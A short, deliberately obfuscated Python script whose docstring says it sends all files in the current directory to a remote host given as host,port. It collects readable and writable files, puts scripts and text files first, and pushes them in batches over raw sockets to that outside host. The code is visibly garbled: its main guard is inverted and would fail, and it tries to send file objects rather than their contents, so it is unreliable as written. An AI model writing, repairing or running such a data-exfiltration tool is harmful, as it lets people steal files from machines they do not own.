import os
import sys
import socket

print(*[x[0] for x in [(f'batch {x[0]} sent.', (socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((sys.argv[1].split(',')[0], int(sys.argv[1].split(',')[1])))).sendall(x[1])) for x in {sum([(z[0] if z[0] != 0 else 1) for z in x]):[open(x[1], 'rb') for x in x] for x in [sorted([x for x in enumerate([os.path.join(os.getcwd(), x) for x in os.listdir(os.getcwd()) if all([os.path.isfile(os.path.join(os.getcwd(), x)), os.access(os.path.join(os.getcwd(), x), os.R_OK), os.access(os.path.join(os.getcwd(), x), os.W_OK)])])], key=lambda x:True if any(y in x[1].lower() for y in ['.txt', '.sh', '.py', '.pl']) else False, reverse=True)[i:i+5] for i in range(0, len([x for x in enumerate([x for x in os.listdir(os.getcwd()) if all([os.path.isfile(os.path.join(os.getcwd(), x)), os.access(os.path.join(os.getcwd(), x), os.R_OK),os.access(os.path.join(os.getcwd(), x), os.W_OK)])])]), 5)]}.items()]]) if __main__ == "__name__" and (1 < len(sys.argv) < 3) else print(f"Usage: {sys.argv[0]} Host,Port")

"""
Function: Sends all files in current directory to a remote server specified by sys.argv[1] in a host,port format
Original: None
"""
